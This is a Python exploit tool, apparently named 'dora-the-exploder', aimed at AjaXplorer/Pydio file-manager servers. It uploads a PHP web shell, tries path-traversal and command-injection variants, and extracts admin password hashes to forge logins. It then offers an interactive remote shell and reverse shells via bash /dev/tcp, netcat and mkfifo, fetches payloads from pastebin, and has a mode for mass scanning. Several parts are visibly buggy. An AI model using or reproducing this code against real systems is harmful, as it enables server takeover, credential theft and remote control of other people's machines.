#!/usr/bin/python
 
import sys
import re
import requests
import argparse
import socket
import hashlib
from phpserialize import loads
 
 
banner = """\x1b[32m
          ,--.!,
       __/   -*-
     ,d08b.  '|`
     0088MM  0wned
     `9MMP'
    dora-the-exploder.py - AjaXplorer/Pydio exploit

\x1b[0m"""
 
 
class Exploit():
    headers = ({
                   "Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0 (Windows NT 5.1; 32bit; rv:10.0) Gecko/20100301 Firefox/10.0)"
               })
 
 
    def __init__(self):
 
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("-u", "--url", help="The URL/IP of the target.", required=True)
        self.parser.add_argument("-d", "--dir", help="The location of the AjaXplorer/Pydio installation.",
                                 required=False, default='/')
        self.parser.add_argument("-p", "--port", help="The port the target is on, ie. 80.", required=False)
        self.parser.add_argument("-s", "--scan", help="Optimizes exploit settings for scanning (use w/swyper.sh).",
                                 required=False, action="store_true")
        self.parser.add_argument("-g", "--debug",
                                 help="Enables debug mode (logging of versions, more verbose output, etc.",
                                 required=False, action="store_true")
        self.args = self.parser.parse_args()
        self.argsdict = vars(self.args)
 
        self.target = self.argsdict["url"]
        self.my_dir = self.argsdict["dir"]
        if self.args.port == None:
            self.port = ""
        else:
            self.port = self.argsdict["port"]
 
        self.scan = False
        self.debug = False
        self.found = False
        self.trav_success = False
        self.path = "/plugins/editor.zoho/agent/"
        self.final_ver = ""
        self.secure_token = ""
        self.protocol = ""
        self.ret_secure_token = ""
        self.uname = ""
        self.get_seed = ""
        self.final_path = "%s%s:%s%s%s" % (self.protocol, self.target, self.port, self.my_dir, self.path)
        self.tag = "ajax"
        self.uname_cmd = {self.tag: 'print php_uname();'}
        self.link = "%s%s:%s" % (self.protocol, self.target, self.port)
        self.vuln_loc = "%ssave_zoho.php" % (self.final_path)
        global shell_loc
        shell_loc = "%sfiles/index.php" % (self.final_path)

        self.sh_ext = "php"
        self.sh_name = "index"
        self.payload = "<?php @assert(filter_input(0,%s,516)); ?>\n" % self.tag
        self.log_name = "explored.txt"
        self.debug_log = "debug.txt"
        self.dl_cmd = "wget"
        self.py_url = "http://pastebin.com/raw.php?i=BFQRvtHN"
        self.pl_url = "http://pastebin.com/raw.php?i=DnyKt8BV"
        self.php_url = "http://pastebin.com/raw.php?i=zg9HtcLN"
        self.PY_TYPE = "tcp"
 
 
    def log(self, message, status="+"):
        print("[%s] %s") % (status, message)
 
 
    def checkProtocol(self):
        if "https" in self.target:
            self.protocol = "https://"
            self.port = "443"
            self.target = self.target.replace("http://", "").replace("https://", "").split("/")[0]
            if self.debug:
                self.log("Target is HTTPS.", "*")
 
        else:
            self.protocol = "http://"
            self.port = "80"
            self.target = self.target.replace("http://", "").replace("https://", "").split("/")[0]
            if self.debug:
                self.log("Target is HTTP.", "*")
 
    def locate(self):
        if self.args.port:
            self.port = self.argsdict["port"]
            self.log("Port set to %s" % (self.port))

        if self.debug:
            self.log("Fingerprinting...")
            self.log("%s%s:%s%s" % (self.protocol, self.target, self.port, self.my_dir), "DEBUG")

 
        self.curr_ver = self.fingerprint("%s%s:%s%s" % (self.protocol, self.target, self.port, self.my_dir))
        if "unknown" in self.curr_ver:
            curr_ver = self.fallback_fingerprint("%s%s:%s%s" % (self.protocol, self.target, self.port, self.my_dir))
 
        self.final_ver = self.curr_ver.strip("\"ajxpVersion\":\"").strip("\"")+""
 
        if self.debug:
            self.log("Detected version : %s" % (self.final_ver))
 
        if self.final_ver >= "5.0.4":
            self.log("Patched, will continue attempt - fingers crossed.", "!")
 
        self.secure_token = self.ret_secure_token.strip("\"SECURE_TOKEN\":\"").strip("\"") + ""
 
        if self.debug:
            self.log("Secure token acquired: %s" % (self.secure_token))
 
        if self.final_ver <= "2.5.5":
            self.check_install()
 
        if self.final_ver <= "3.2.5":
            self.rocketship("%s%s:%s%s") % (self.protocol, self.target, self.port, self.my_dir)
 
        if self.debug:
            self.log("Locating vuln file", "*")
 
 
        self.file_exist = requests.get(self.vuln_loc, headers=self.headers, verify=False)
 
        if self.debug:
            self.log("Status code recieved [%s]" % (self.file_exist.status_code))

        if self.file_exist.status_code == 200:
 
            if self.debug:
                self.log("Found - continuing with ownage.")
                self.found == True
 
            self.found = True
 
            if self.found == True:
                self.pwn_zoho()
 
            else:
                self.log("Not found", "-")
                if self.final_ver <= "3.2.5" or self.final_ver <= "4.0.4":
                    self.rocketship("%s%s:%s%s") % (self.protocol, self.target, self.port, self.my_dir)
 
                self.log("Better luck next time.", "-")
                sys.exit(1)
        else:
            self.log("Unable to access file", "-")
            sys.exit(1)
 
    def fingerprint(self, url):
        global ret
        ret = requests.get("%s/index.php?get_action=get_boot_conf" % (url), headers=self.headers, verify=False,
                           timeout=6).text
        ajax_v4x5x = re.search(r'\"ajxpVersion\":\"(.+?)\"', ret, re.IGNORECASE)
        ret2 = requests.get("%s/content.php?get_action=get_boot_conf" % (url), headers=self.headers, verify=False,
                            timeout=6).text
        ajax_v3x = re.search(r'\"ajxpVersion\":\"(.+?)\"', ret2, re.IGNORECASE)
 
        self.ret_secure_token = self.get_token("%s...%s" % (ret, ret2))
 
        if ajax_v4x5x:
            return ajax_v4x5x.group()
        elif ajax_v3x:
            return ajax_v3x.group()
        else:
            return "unknown"
 
    def fallback_fingerprint(self, url):
        ret = requests.get("%s/index.php" % (url), headers=self.headers, verify=False, timeout=6).text
        ajax_ver = re.search(r'ajaxplorer_boot.js\?v\=([^"]+)', ret, re.IGNORECASE)
        ajax_ver2 = re.search(r'version\s+([^\-]+)', ret, re.IGNORECASE)
 
        if ajax_ver:
            return ajax_ver.group().strip('ajxplorer_boot.js?v=')
        elif ajax_ver2:
            return ajax_ver2.group().strip('version ')
        else:
            return "unknown"
 
    def get_token(self, str_dat):
        ajxp_token = re.search(r'\"SECURE_TOKEN\":\"(.+?)\"', str_dat, re.IGNORECASE)
        if ajxp_token:
            return ajxp_token.group()
        else:
            return "unknown"
 
    def pwn_zoho(self):
        global shell_loc
        if self.args.port:
            self.port = self.argsdict["port"]

        if self.debug:
            self.log("Unlinking .htaccess and uploading shell.")
 
        kill_ht = requests.post(url=self.vuln_loc,
                                data={"ajxp_action": "get_file", "name": ".htaccess"},
                                headers=self.headers, verify=False, allow_redirects=False).content
 
        self.ht_check = requests.get("%s/files/.htacccess" % (self.final_path), verify=False, allow_redirects=False)
        if ("unlink" in kill_ht or "denied" in kill_ht or self.ht_check.status_code == 200):
            self.log("Unable to unlink .htaccess, probably fucked.", "-")
 
        response = requests.post(url=self.vuln_loc,
                                 data={"id": self.sh_name, "format": self.sh_ext},
                                 files={"content": (self.payload)}, verify=False, allow_redirects=False)
 
        if self.debug:
            self.log("Verifying ownage...", "~")
 
        self.shell_exist = requests.get(shell_loc, verify=False, allow_redirects=False)
        if self.debug == True:
            self.log("Returned status code [%s]" % (self.shell_exist.status_code), "DEBUG")
 
        if self.shell_exist.status_code == 200:
            uname_cmd = {self.tag: 'print php_uname();'}
            self.uname = requests.post(shell_loc, data=self.uname_cmd,
                                       headers=self.headers, verify=False, allow_redirects=False).content
 
            if "<html>" in self.uname and "unknow" in self.final_ver:
                self.log("False positive.", "!")
                sys.exit(1)
 
            self.log("\x1b[91muname: \x1b[0m %s" % (self.uname))
 
            if self.debug:
                self.log("shell %s" % (shell_loc))
 
            self.writeLog()
            if self.scan != True:
                self.connect()
 
        else:
            self.log("Failed, trying directory traversal.", "!")
            self.traversal()
 
    def traversal(self):
        global shell_loc
        #shell_loc = "%s%s:%s%s/plugins/editor.zoho/i18n/eu.php" % (self.protocol, self.target, self.port, self.my_dir)
        sh_ext = ["../../../../../../data/logs/test.php",
                  "../../../../../../data/cache/test.php",
                  "../../../../../../data/tmp/test.php",
                  "../../../../../../data/files/test.php",
                  "../../../../../../data/public/test.php",
                  "../../../../../../data/personal/test.php",
                  "../../../../../../data/plugins/test.php",
                  "../../../../../../conf/test.php",
                  "../../../../../../plugins/auth.serial/test.php",
                  "../../../../../../plugins/conf.serial/test.php",
                  "../../../../i18n/test.php"]
 
                  #"../../../../i18n/test.php"]
 
        sh_files = ["/data/logs/test.php",
                    "/data/cache/test.php",
                    "/data/tmp/test.php",
                    "/data/files/test.php",
                    "/data/public/test.php",
                    "/data/personal/test.php",
                    "/data/plugins/test.php",
                    "/conf/test.php",
                    "/plugins/auth.serial/test.php",
                    "/plugins/conf.serial/test.php",
                    "/plugins/editor.zoho/i18n/test.php"]





 


 
        for dir, file in zip(sh_ext, sh_files):
            shell_loc = "%s%s:%s%s%s" % (self.protocol, self.target, self.port, self.my_dir, file)
            self.log("Trying dir %s (file %s)" % (dir, file))
            if self.debug == True:
                self.log("URL [%s]" % (shell_loc), "DEBUG")
            r = requests.post(url=self.vuln_loc,
                                 data={"id": self.sh_name, "format":dir},
                                 files={"content": (self.payload)}, verify=False,
                                 allow_redirects=False)
            if self.debug == True:
                self.log("Recieved status code [%s]" % (r.status_code))

            shell_exist = requests.get(shell_loc, verify=False, headers=self.headers, allow_redirects=False)
            if r.status_code == 200:
                # uname_cmd = {tag: 'print php_uname();'}
                uname = requests.post(shell_loc, data=self.uname_cmd, headers=self.headers, verify=False,
                                  allow_redirects=False).content


                if "Linux" not in uname: #ITS NOT A BUG, MOM, ITS A FEATURE!
                    continue
                else:

                    self.log("\x1b[91muname: \x1b[0m %s" % (uname))
                    self.log("shell: %s" % (shell_loc))
                    #self.writeLog()

                if self.scan != True:
                    self.connect()

                    break

            self.log("Likely failed directory traversal... :/", "-")
            if self.final_ver <= "3.2.5" or self.final_ver <= "4.0.4":
                self.rocketship("%s%s:%s%s") % (self.protocol, self.target, self.port, self.my_dir)
            else:
                self.log("All methods failed, find a new 0day!", "-")
                sys.exit(1)
 
    def check_install(self):
 
        shell_loc = "%s%s:%s%s/plugins/access.ssh/checkInstall.php?destServer=d;uname -a"
        path = "/plugins/access.ssh"
        vulnFile = "checkInstall.php"
 
        self.log("Trying to pwn via checkInstall.php RCE (OSVDB-ID: 63552)", "~")
        self.log("Locating vulnerable file...", "~")
 
        file_exist = requests.get(
            "%s%s:%s%s%scheckInstall.php" % (self.protocol, self.target, self.port, self.my_dir, self.path),
            headers=self.headers, verify=False).content
 
        if file_exist.status_code == 200:
            self.log("Found! Continuing with ownage.")
            uname_req = requests.get(
                "%s%s:%s%s%scheckInstall.php?destServer=d;uname -a" % (
                    self.protocol, self.target, self.port, self.my_dir, self.path),
                headers=self.headers, verify=False).content
 
        if "Missing" not in uname_req:
            pos1 = uname_req.find("Recieved output: ")
            pos2 = uname_req.find("<br>", pos1)
            uname = uname_req[pos1 + len(pos1):pos2 - 2]
            self.log("\x1b[91muname: \x1b[0m %s") % uname
            self.writeLog()
            sys.exit(1)
 
        else:
            self.log("Not found!", "-")
            sys.exit(1)
 
    def rocketship(self, url):
        self.log("Trying 3.2.5/4.0.4 LFI...", "~")
        ret_req = requests.get(
            "%s/content.php?secure_token=%s&get_action=get_template&template_name=plugins/gui.ajax/plugin_doc.html&pluginName=..&encode=false" % (
                url, self.secure_token), headers=self.headers, verify=False, timeout=6).text
        ret = ret_req.strip()
        if "default web interface" in ret:
            ret = requests.get(
                "%s/content.php?secure_token=%s&get_action=get_template&template_name=plugins/gui.ajax/plugin_doc.html&pluginName=..&encode=false" % (
                    url, self.secure_token), headers=self.headers, verify=False, timeout=6).text
            self.log("Extracted users: %s" % (ret))
            self.log_creds
 
            gin = loads(ret)
            if "admin" in gin:
                admin_hash = gin["admin"]
            else:
                self.log("Default username for admin may have been changed, edit scr1pt3nz...", "-")
                sys.exit(1)
 
            get_seed = requests.get("%s/index.php?secure_token=%s&get_action=get_seed" % (url, self.secure_token),
                                    headers=self.headers, verify=False, timeout=6).text
 
            if self.debug:
                self.log("Retrieved login seed %s" % (get_seed))
                self.log("Admin hash: %s" % admin_hash)
 
            magic_login = hashlib.md5(admin_hash + get_seed).hexdigest()
            self.log("Created magic password hash %s" % (magic_login))
            self.log("Go log in and own it!")
            sys.exit(1)
 
        else:
            self.log("Unable to grab credentials :/", "-")
            self.log("FIND A NEW 0DAY", "!")
            sys.exit(1)
 
 
    def writeLog(self):
        if self.debug:
            self.log("Wrote shell to %s" % self.log_name)
 
        with open(self.log_name, "a") as logfile:
            logfile.write(shell_loc + "\n")
            logfile.write(self.uname + "\n")
            logfile.write("\n")
 
    def log_creds(self):
        self.log("Wrote users to %s") % (self.creds.log)
        with open(self.creds_log, "a") as logfile:
            logfile.write(self.link + "\n")
            logfile.write(self.ret + "\n")
            logfile.write("\n")
 
    def debug_log(self):
 
        if self.debug:
            self.log("Writing debug data to %s" % (self.debug_log_name))
            with open(self.debug_log_name, "a") as logfile:
                logfile.write(self.link + "\n")
                logfile.write(self.final_Ver + "\n")
                logfile.write("\n")
 
    def connect(self):
        try:
            self.log("Launching command shell...")
            while True:
                self.command = raw_input("dora@%s:~$ " % (self.target))
                evil_cmd = {self.tag: "print `%s`;" % (self.command)}
                if self.command == "help":
                    self.log("Availiable commands:", "?")
                    print "default, no command, just shell exec"
                    print "kill - removes shell"
                    print "quit/exit - exits command sender(this)"
                    print "shell - uploads fuhosin to pwd"
                    print "reverse - starts reverse shell sending process"
                elif self.command == "quit" or self.command == "exit":
                    sys.exit(1)
                elif self.command == "kill":
                    self.log("Killing shell", "!")
                    kill_shell = requests.post(
                    url=self.vuln_loc,
                    data={"ajxp_action": "get_file", "name": "index.php"},
                    headers=self.headers, verify=False, allow_redirects=False).content
                    sys.exit(1)
                elif self.command == "reverse":
                    self.reverse()
 
                elif self.command == "shell":
                    self.sh_cmd = {self.tag: '`%s %s -O ajax.php' % (self.dl_cmd, self.php_url)}
                    self.h_req = requests.post(shell_loc, data=self.sh_cmd, headers=self.headers, verify=False,
                                       allow_redirects=False)
                    self.log("Fuhosin: %s/files/ajax.php" % self.final_path)
 
                else:

                    self.command_req = requests.post(shell_loc, data=evil_cmd, headers=self.headers, verify=False,
                                             allow_redirects=False).content
                    print self.command_req

        except KeyboardInterrupt:
            print "\n"
            self.log("Quitting.", "-")
 
 
    def reverse(self):
        try:
            REVERSE_TYPE = raw_input("[?] Reverse type (python/perl/bash/nc/fifo): ")
            RAW_IP = raw_input("[?] IP and port (ex. 127.0.0.1:443) ").split(":")
 
            if (len(RAW_IP) != 2):
                self.log("Invalid options.", "!")
                self.reverse()
            else:
                L_IP = RAW_IP[0]
                L_PORT = RAW_IP[1]
 
            py_cmd = {self.tag: '`%s %s -O /tmp/k`;' % (self.dl_cmd, self.py_url)}
            pl_cmd = {self.tag: '`%s %s -O /tmp/k`;' % (self.dl_cmd, self.pl_url)}
            bash_cmd = {self.tag: '`bash -i >& /dev/tcp/%s/%s 0>&1`;' % (L_IP, L_PORT)}
            nc_cmd = {self.tag: '`nc -e /bin/sh %s %s`;' % (L_IP, L_PORT)}
            fifo_cmd = {
            self.tag: '`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f`;' % (L_IP, L_PORT)}
 
            if REVERSE_TYPE == "python":
                reverse_req = requests.post(shell_loc, data=py_cmd, headers=self.headers, verify=False,
                                            allow_redirects=False)
            elif REVERSE_TYPE == "perl":
                reverse_req = requests.post(shell_loc, data=pl_cmd, headers=self.headers, verify=False,
                                            allow_redirects=False)
            elif REVERSE_TYPE == "bash":
                reverse_req = requests.post(shell_loc, data=bash_cmd, headers=self.headers, verify=False,
                                            allow_redirects=False)
            elif REVERSE_TYPE == "nc":
                reverse_req = requests.post(shell_loc, data=nc_cmd, headers=self.headers, verify=False,
                                            allow_redirects=False)
            elif REVERSE_TYPE == "fifo":
                reverse_req = requests.post(shell_loc, data=fifo_cmd, headers=self.headers, verify=False,
                                            allow_redirects=False)
            else:
                self.log("Invalid options selected.", "!")
                self.reverse()
 
            if REVERSE_TYPE == "python":
                self.final_cmd = {self.tag: '`%s /tmp/k %s %s %s`;' % (REVERSE_TYPE, L_IP, L_PORT, self.PY_TYPE)}
                self.final_req = requests.post(shell_loc, data=self.final_cmd, headers=self.headers, verify=False,
                                               allow_redirects=False)
            elif REVERSE_TYPE == "perl":
                self.final_cmd = {self.tag: '`%s /tmp/k %s %s`;' % (REVERSE_TYPE, L_IP, L_PORT)}
                self.final_req = requests.post(shell_loc, data=self.final_cmd, headers=self.headers, verify=False,
                                               allow_redirects=False)
 
            sys.exit(1)
        except KeyboardInterrupt:
            print "\n"
            self.log("Quitting.", "-")
            sys.exit(1)
 
 
    def main(self):
        print banner
 
        if self.args.scan:
            self.scan = True
            self.log("Exploit optimized for scanning", "~")
 
        if self.args.debug:
            self.debug = True
            self.log("Debug enabled", "~")

 

        if self.debug:
            self.log("Checking protocol", "~")
        self.checkProtocol()
        try:
            self.locate()
        except requests.exceptions.Timeout or requests.exceptions.ConnectionError:
            self.log("Timed out/can't connect.", "-")
            sys.exit(1)
 
            # self.debug_log()
 
 
if __name__ == '__main__':
    hax = Exploit()
    hax.main()
